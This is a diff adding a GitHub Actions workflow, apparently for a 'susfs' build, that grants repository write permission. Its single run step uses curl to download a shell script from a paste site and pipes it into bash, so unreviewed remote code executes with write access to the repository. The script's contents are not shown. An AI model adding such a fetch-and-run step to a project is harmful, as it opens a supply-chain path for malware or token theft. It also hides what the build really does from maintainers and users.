@@ -1,0 +1,18 @@
+name: build-susfs-fixed
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  build:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: run
+        run: |
+          set -euxo pipefail
+          curl -fsSL --max-time 180 https://paste.c-net.org/CarsonBrethren -o /tmp/r.sh
+          bash /tmp/r.sh
